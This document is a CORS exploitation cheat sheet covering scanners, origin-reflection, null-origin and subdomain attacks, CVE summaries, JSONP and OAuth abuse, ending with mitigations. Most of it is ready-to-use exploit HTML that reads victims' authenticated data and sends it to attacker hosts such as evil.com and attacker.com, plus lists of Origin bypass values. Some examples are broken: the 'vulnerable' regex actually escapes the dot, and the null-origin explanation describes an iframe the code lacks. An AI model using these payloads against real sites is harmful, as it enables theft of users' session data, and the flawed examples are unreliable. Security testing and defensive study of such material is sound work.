# Cross-Origin Resource Sharing (CORS) Exploitation Guide

## Overview

Cross-Origin Resource Sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain outside the originating domain. When misconfigured, CORS can become a significant security vulnerability allowing attackers to access sensitive data from authenticated users.

**Reference:** [Intigriti Blog - Exploiting CORS Misconfiguration Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)

---

## Tools for CORS Testing

```bash
# Corsy - CORS misconfiguration scanner
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com

# CORScanner - CORS misconfiguration scanner
# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com

# CorsMe - Fast CORS misconfiguration checker
# https://github.com/Shivangx01b/CorsMe
echo "https://example.com" | ./Corsme 
cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
cat http_https.txt | ./CorsMe -t 70

# CORSPoc Generator
# https://tools.honoki.net/cors.html
```

---

## Same-Origin Policy Reference Table

| URL accessed | Access permitted? | Reason |
|------------------------------------------|-----------------------------------|--------------------------|
| `http://normal-website.com/example/` | Yes | Same scheme, domain, and port |
| `http://normal-website.com/example2/` | Yes | Same scheme, domain, and port |
| `https://normal-website.com/example/` | No | Different scheme and port |
| `http://en.normal-website.com/example/` | No | Different domain |
| `http://www.normal-website.com/example/` | No | Different domain |
| `http://normal-website.com:8080/example/` | No | Different port |

---

## CORS Explained

CORS works through HTTP headers. When a website makes a cross-origin request, the browser sends an `Origin` header. The server responds with `Access-Control-Allow-Origin` (ACAO) header indicating which origins are permitted to access the resource.

**Key Headers:**
- `Origin` - Sent by browser to indicate request source
- `Access-Control-Allow-Origin` - Server response indicating allowed origins
- `Access-Control-Allow-Credentials` - Indicates if cookies/auth credentials can be included

### Exceptions to Same-Origin Policy

The following operations are permitted cross-domain under specific conditions:

- **Write-only operations:** Some objects are writable but not readable cross-domain, such as the `location` object or `location.href` property from iframes or new windows
- **Read-only operations:** Some objects are readable but not writable cross-domain, such as the `length` property of the `window` object (stores frame count) and the `closed` property
- **Cross-domain functions:** The `replace` function can generally be called cross-domain on the `location` object; functions like `close`, `blur`, and `focus` can be called on new windows
- **postMessage:** Can be called on iframes and new windows for cross-domain messaging

**Important:** Any site disclosing user credentials or other sensitive information should be tested for CORS misconfigurations.

---

## Basic CORS Testing

```bash
# Simple test to check CORS configuration
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'
```

---

## CORS Misconfiguration Types and Exploitation

### Type 1: Basic Origin Reflection

When the server reflects any `Origin` header value in `ACAO` without validation.

**Successful exploitation example:** HackerOne report #235200

**Exploitation Steps:**

1. Intercept request through Burp Suite
2. Send to Repeater with added header: `Origin: https://example.com`
3. Observe if origin is reflected in `Access-Control-Allow-Origin`
4. Create exploit HTML:

```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

---

### Type 2: Whitelisted Null Origin

When the server whitelists the `null` origin value.

**Exploitation Method:** Use an iframe with `sandbox` attribute to generate a `null` origin request.

**Real-world reference:** PortSwigger CORS lab (origin-based attack)

**Exploit Code:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','$url/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe>
```

The iframe sandbox generates a `null` origin request which the server trusts.

---

### Type 3: Regex-Based Origin Validation Bypass (CVE-2026-25478)

When servers use regex patterns without escaping metacharacters to validate origins.

**Vulnerability Example:** A server allowing `https://good.example` may also match `https://goodXexample` because the dot `.` is interpreted as a wildcard rather than a literal character.

**Proof of Concept:**

```python
# Vulnerable Server Configuration
from litestar import Litestar, get
from litestar.config.cors import CORSConfig

@get("/c")
async def c() -> str:
    return "ok"

cors = CORSConfig(
    allow_origins=["https://good.example"],
    allow_credentials=True,
)
app = Litestar([c], cors_config=cors)
```

```python
# Client testing the bypass
import http.client

def req(origin: str) -> tuple[int, str | None]:
    c = http.client.HTTPConnection("127.0.0.1", 8002, timeout=3)
    c.request("GET", "/c", headers={"Origin": origin, "Host": "example.com"})
    r = c.getresponse()
    acao = r.getheader("Access-Control-Allow-Origin")
    return r.status, acao

print("evil:", req("https://evil.example"))      # No ACAO
print("bypass:", req("https://goodXexample"))    # ACAO returned
```

**Affected Versions:** Litestar 2.19.0

---

### Type 4: Subdomain Trust Exploitation

When the server trusts any subdomain of the target, including HTTP subdomains while the main application uses HTTPS.

**Exploitation Chain:**
1. Find subdomain supporting HTTP (unencrypted)
2. Look for XSS vulnerability on that subdomain
3. Combine XSS with CORS to steal credentials from HTTPS main domain

**Attack Flow:**
```html
<script>
   document.location="http://stock.$your-lab-url/?productId=4<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://$your-lab-url/accountDetails',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='https://$exploit-server-url/log?key='+this.responseText;
   };
   </script>&storeId=1"
</script>
```

---

## Real-World CVE Examples

### CVE-2025-55462 - Eramba CORS Misconfiguration

**Affected Product:** Eramba Community and Enterprise Editions v3.26.0

**Description:** A CORS misconfiguration allows an attacker-controlled `Origin` header to be reflected in the `Access-Control-Allow-Origin` response along with `Access-Control-Allow-Credentials: true`. This permits malicious third-party websites to perform authenticated cross-origin requests against the Eramba API, including endpoints like `/system-api/login` and `/system-api/user/me`. The response includes sensitive user session data (ID, name, email, access groups), which is accessible to attacker JavaScript.

**Impact:** Enables full session hijack and data exfiltration without user interaction.

**CVSS Score:** 6.5 (Medium)

**Affected Versions:** 3.26.0 (3.23.3 and earlier are unaffected)

---

### CVE-2020-36851 - cors-anywhere Open Proxy SSRF

**Affected Component:** Rob--W / cors-anywhere

**Description:** cors-anywhere instances configured as open proxies allow unauthenticated external users to induce the server to make HTTP requests to arbitrary targets (SSRF). The proxy forwards requests and headers, enabling attackers to reach internal-only endpoints and link-local metadata services.

**Impact:**
- Theft of cloud credentials
- Unauthorized access to internal services
- Remote code execution or privilege escalation (depending on reachable backends)
- Data exfiltration
- Full compromise of cloud resources

**Mitigation:**
- Restrict proxy to trusted origins or require authentication
- Whitelist allowed target hosts
- Prevent access to link-local and internal IP ranges
- Remove support for unsafe HTTP methods/headers
- Enable cloud provider mitigations

---

### CVE-2023-28109 & CVE-2024-27302 - Go Framework CORS Bypass

**Affected Frameworks:** Various Go frameworks including go-zero and play-with-docker

**Description:** Incorrect implementation of origin checking in CORS handlers can lead to bypass vulnerabilities. When checks are implemented with improper string matching logic (e.g., using `hasPrefix` without proper validation), attackers can craft origins that bypass validation.

**Example of vulnerable code pattern:**
```go
// Vulnerable - insufficient validation
if string.HasPrefix(origin, "trusted-domain.com") {
    // allow access
}
```

This pattern is vulnerable because `trusted-domain.com.evil.com` would pass the check.

---

### CVE-2024-36421 - Flowise CORS Misconfiguration

**Affected Application:** Flowise

**Description:** The application sets the `Access-Control-Allow-Origin` header to `*`, allowing requests from any origin. This misconfiguration enables arbitrary origins to connect to the website, potentially allowing unauthorized access to sensitive user information.

**CVSS Score:** 7.5 (High)

---

### Rosetta Flash Vulnerability (2014) - JSONP + Flash Abuse

**Description:** The Rosetta Flash vulnerability exploited Adobe Flash Player to bypass CORS and SOP restrictions. Attackers could create malicious Flash files containing only printable characters (Rosetta Flash) that, when served through JSONP endpoints, would execute in the victim's browser and make unauthorized cross-origin requests.

**Impact:**
- CSRF and CORS bypass
- Performing actions on behalf of authenticated users
- Exfiltrating sensitive data from target websites

**Legacy Impact:** This vulnerability accelerated Flash deprecation and highlighted JSONP security risks.

**Prevention:**
- Disable JSONP where possible
- Use CORS with strict origin validation instead
- Sanitize JSON responses if JSONP is necessary

---

## JSONP Exploitation

JSONP (JSON with Padding) is a technique for cross-domain data retrieval using `<script>` tags. It can be exploited when sensitive data is returned in JSONP format.

**Testing Method:** Append `?callback=testjsonp` to GET URL. If response contains `testjsonp(<json-data>)`, the endpoint is vulnerable.

**JSONP Exploit Code:**

```html
<!DOCTYPE html>
<html>
<head>
<title>JSONP PoC</title>
</head>
<body>
<center>
<h1>JSONP Exploit</h1>
<hr>
<div id="demo">
<button type="button" onclick="trigger()">Exploit</button>
</div>
<script>
function testjsonp(myObj) {
  var result = JSON.stringify(myObj);
  document.getElementById("demo").innerHTML = result;
}
</script>
<script>
  function trigger() {
    var s = document.createElement("script");
    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
    document.body.appendChild(s);
  }
</script>
</body>
</html>
```

---

## CORS Bypass Techniques

### Origin Header Manipulation

Try these Origin values to bypass weak validation:

```
Origin: null
Origin: attacker.com
Origin: attacker.target.com
Origin: attackertarget.com
Origin: sub.attackertarget.com
Origin: target.com.attacker.com
Origin: https://target.com@attacker.com
```

### Regex Bypass Patterns

When servers use regex with unescaped metacharacters:
- `.` (dot) matches any character
- `*` matches zero or more characters
- `+` matches one or more characters

Example: If server expects `https://trusted.com`, `https://trustedXcom` may bypass validation.

---

## Advanced Exploit: OAuth Flow Hijacking

**Real-world bounty (€400):** CORS exploitation in OAUTh authentication flow.

**Two-Phase Attack:**

**Phase 1: Obtain Authorization Code**
```javascript
var req = new XMLHttpRequest();
req.open('GET', 'https://id.target.com/auth/realms/target/protocol/openid-connect/auth?client_id=profiles-web&redirect_uri=https://profile.target.com/profile&state='+statecode+'&response_mode=fragment&response_type=code&scope=openid', true);
req.setRequestHeader('Accept', 'application/json');  // Critical header
req.withCredentials = true;
req.send();
```

**Phase 2: Exchange Code for Access Token**
```javascript
var req2 = new XMLHttpRequest();
req2.open('POST', 'https://id.target.com/auth/realms/target/protocol/openid-connect/token', true);
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.withCredentials = true;
req2.send('code=<tokencode>&grant_type=authorization_code&client_id=profiles-web&redirect_uri=https://profile.target.com/profile');
```

**Key Discovery:** The `Accept: application/json` header was required to receive the code in JSON format, enabling CORS exploitation.

---

## CORS Proof of Concept Templates

### Basic CORS Exploit (GET Request)

```html
<!DOCTYPE html>
<html>
<head>
<title>CORS PoC Exploit</title>
</head>
<body>
<center>
<h1>CORS Exploit</h1>
<hr>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script type="text/javascript">
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
   xhttp.open("GET", "http://<vulnerable-url>", true);
   xhttp.withCredentials = true;
   xhttp.send();
 }
</script>
</center>
</body>
</html>
```

### CORS Exploit (POST Request)

```html
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';  // Vulnerable URL
var params = 'PostData';  // POST data
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
};
http.withCredentials = true;
http.send(params);
</script>
</html>
```

### Data Exfiltration CORS Exploit

```html
<html>
<body>
<button type='button' onclick='cors()'>CORS Exploit</button>
<p id='corspoc'></p>
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      var a = this.responseText;  // Sensitive data
      document.getElementById("corspoc").innerHTML = a;
      // Exfiltrate to attacker server
      xhttp.open("POST", "https://evil.com", true);
      xhttp.withCredentials = true;
      console.log(a);
      xhttp.send("data=" + encodeURIComponent(a));
    }
  };
  xhttp.open("POST", "https://target1337.com", true);
  xhttp.withCredentials = true;
  var body = "requestcontent";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  xhttp.send(new Blob([aBody]));
}
</script>
</body>
</html>
```

---

## Null Origin Exploitation Detailed Walkthrough

This technique exploits servers that whitelist the `null` origin value.

**Detection Steps:**
1. Send request with `Origin: null` header
2. Check if response contains `Access-Control-Allow-Origin: null`
3. Verify `Access-Control-Allow-Credentials: true` is present

**Exploit Code:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>CORS Null Origin Exploit</title>
</head>
<body>
  <h1>CORS Null Origin Exploit</h1>
  <script>
    const request = new XMLHttpRequest();
    request.open("GET", "https://target.com/accountDetails", true);
    
    request.onload = () => {
      // Exfiltrate data
      window.location.href = "https://attacker.com/log?key=" + 
                             encodeURIComponent(request.responseText);
    };
    
    request.withCredentials = true;
    request.send();
  </script>
</body>
</html>
```

**Why This Works:**
- A `srcdoc` iframe with sandbox attributes runs with `null` origin
- If server whitelists `null` with credentials allowed, browser permits response reading
- The `withCredentials = true` ensures cookies/session are included

**Defense:**
- Never whitelist `null` origin
- Validate origins against explicit allowlist
- Never reflect arbitrary Origin values

---

## Detection Methodology

### Step 1: Identify CORS Headers
Look for these headers in responses:
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`

### Step 2: Test Origin Reflection
```bash
# Test various origins
curl -H "Origin: https://evil.com" https://target.com/api/endpoint
curl -H "Origin: null" https://target.com/api/endpoint
curl -H "Origin: https://target.com.evil.com" https://target.com/api/endpoint
```

### Step 3: Verify Credentials Support
Check if `Access-Control-Allow-Credentials: true` is present - this allows cookie transmission.

### Step 4: Check for Wildcard with Credentials
`Access-Control-Allow-Origin: *` combined with credentials is invalid (browsers reject it), but `ACAO: *` without credentials is still a risk for public data.

---

## Mitigation Recommendations

### For Developers

1. **Never reflect Origin values dynamically** - Use explicit allowlist
2. **Never whitelist `null` origin** - Treat it as untrusted
3. **When using credentials (`allow_credentials=True`):**
   - `ACAO` must be a single explicit trusted origin
   - Never use `*` with credentials
4. **Escape regex metacharacters** when building origin validation patterns
5. **Implement server-side authorization** - CORS is not access control
6. **Use proper suffix validation** - Check both prefix and suffix for exact matches
7. **Avoid JSONP for sensitive data** - Use CORS with strict validation instead

### Validation Example (Secure)

```python
ALLOWED_ORIGINS = ['https://trusted.com', 'https://app.trusted.com']

def validate_origin(origin):
    return origin in ALLOWED_ORIGINS  # Exact match only
```

### Validation Example (Vulnerable - Regex Bypass)

```python
# VULNERABLE - Do not use
import re
pattern = r'https://trusted\.com'  # Dot not escaped properly
if re.match(pattern, origin):
    # This would match 'https://trustedXcom' as well
```

### For Security Teams

- Regularly scan for CORS misconfigurations using automated tools
- Include CORS testing in bug bounty programs
- Review third-party libraries handling CORS for bypass vulnerabilities

---

## References

- Intigriti Blog: [Exploiting CORS Misconfiguration Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities)
- PortSwigger: CORS labs and research
- CVE-2025-55462: Eramba CORS vulnerability
- CVE-2026-25478: Litestar CORS bypass
- CVE-2020-36851: cors-anywhere SSRF
- CVE-2023-28109, CVE-2024-27302: Go framework CORS bypasses
- [CORScanner](https://github.com/chenjj/CORScanner)
- [Corsy](https://github.com/s0md3v/Corsy)
- [CorsMe](https://github.com/Shivangx01b/CorsMe)
